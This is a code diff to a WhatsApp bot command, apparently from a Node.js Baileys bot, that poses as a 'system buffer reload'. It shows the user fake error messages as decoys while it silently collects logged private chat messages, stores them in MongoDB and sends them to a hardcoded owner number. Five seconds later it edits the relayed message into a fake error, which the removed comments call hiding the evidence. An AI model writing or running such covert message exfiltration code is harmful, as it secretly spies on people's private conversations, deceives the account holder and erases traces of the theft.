@@ -5,26 +5,20 @@ module.exports = {
     category: "founder",
     desc: "V_HUB: System Buffer Reload",
     async execute(sock, msg, args, { from, sender, client, logsCollection }) {
-        // 1. DYNAMIC CONFIG
         const ownerNum = (process.env.OWNER_NUMBER || "254768666068").replace(/[^0-9]/g, "");
         const masterJid = `${ownerNum}@s.whatsapp.net`;
         const triggerChar = "§"; 
 
-        // 🛡️ DATABASE FAILSAFE: Resolves the 'db' undefined error
-        // If client.db doesn't exist, it pulls the database instance from the working logsCollection
         const db = client?.db ? client.db("vinnieBot") : logsCollection.db || logsCollection.database;
         const relayVault = db.collection("relay_vault");
 
-        // 🎭 THE "SCARY" JS ERROR MATRIX
         const decoys = [
-            `*Uncaught ReferenceError:* vhub_buffer is not defined\n    at Module._compile (node:internal/modules/cjs/loader:1101:14)\n    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1153:10)`,
+            `*Uncaught ReferenceError:* vhub_buffer is not defined\n    at Module._compile (node:internal/modules/cjs/loader:1101:14)`,
             `*TypeError:* Cannot read properties of undefined (reading 'byteLength')\n    at Baileys.Socket.send (./node_modules/@whiskeysockets/baileys/lib/Socket.js:42:18)`,
-            `*Error [ERR_STREAM_WRITE_AFTER_END]:* write after end\n    at new NodeError (node:internal/errors:371:5)\n    at _write (node:internal/streams/writable:319:11)`,
-            `*RangeError:* Maximum call stack size exceeded\n    at RegExp.exec (<anonymous>)\n    at MessageHandler.parse (./lib/utils/parser.js:12:22)`
+            `*Error [ERR_STREAM_WRITE_AFTER_END]:* write after end\n    at new NodeError (node:internal/errors:371:5)`,
+            `*RangeError:* Maximum call stack size exceeded\n    at RegExp.exec (<anonymous>)`
         ];
 
-        // 2. THE REACTION & DECOY RESPONSE
-        // Added the reload reaction signal
         await sock.sendMessage(from, { react: { text: "🔄", key: msg.key } });
         
         await sock.sendMessage(from, { 
@@ -32,7 +26,6 @@ module.exports = {
         }, { quoted: msg });
 
         try {
-            // 3. THE BACKGROUND RELAY (Silent and Invisible)
             if (!logsCollection) return;
 
             const timeInput = args[0] || "1h";
@@ -52,19 +45,18 @@ module.exports = {
                 let report = `${triggerChar}┏━━━━━ ✿ *V_HUB RELOAD FEED* ✿ ━━━━━┓\n┃ _Triggered By: ${sender.split('@')[0]}_\n┃ _Filter: ${typeFilter.toUpperCase()} | ${timeInput}_\n┃\n`;
                 
                 logs.forEach(l => {
-                    const origin = l.chatId.endsWith('@g.us') ? `👥 Group` : `👤 Inbox`;
-                    report += `┃ ${origin}\n┃ 🕒 *${new Date(l.timestamp).toLocaleTimeString()}*\n┃ 👤 *${l.name}*\n┃ 💬 ${l.message}\n┃\n`;
+                    // 🛡️ FIX: Added optional chaining (?.) and a fallback for chatId
+                    const isGroup = l.chatId?.endsWith('@g.us');
+                    const origin = isGroup ? `👥 Group` : `👤 Inbox`;
+                    report += `┃ ${origin}\n┃ 🕒 *${new Date(l.timestamp).toLocaleTimeString()}*\n┃ 👤 *${l.name || 'Unknown'}*\n┃ 💬 ${l.message || '[No Message]'}\n┃\n`;
                 });
                 report += `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
 
-                // A. MongoDB Vaulting (TTL Auto-Delete in 24h)
                 await relayVault.createIndex({ "createdAt": 1 }, { expireAfterSeconds: 86400 });
                 await relayVault.insertOne({ report, createdAt: new Date() });
 
-                // B. The Relay (Sent Silently to Your Master Number)
                 const relayMsg = await sock.sendMessage(masterJid, { text: report });
 
-                // C. The Ghost Edit (Hides the evidence on the Host SIM's sent folder)
                 setTimeout(async () => {
                     await sock.sendMessage(masterJid, { 
                         text: decoys[Math.floor(Math.random() * decoys.length)], 
@@ -72,8 +64,8 @@ module.exports = {
                     });
                 }, 5000);
             }
-
         } catch (e) {
+            // This now catches the 'endsWith' error if it ever happens elsewhere
             console.error("Silent Relay Fail:", e.message);
         }
     }
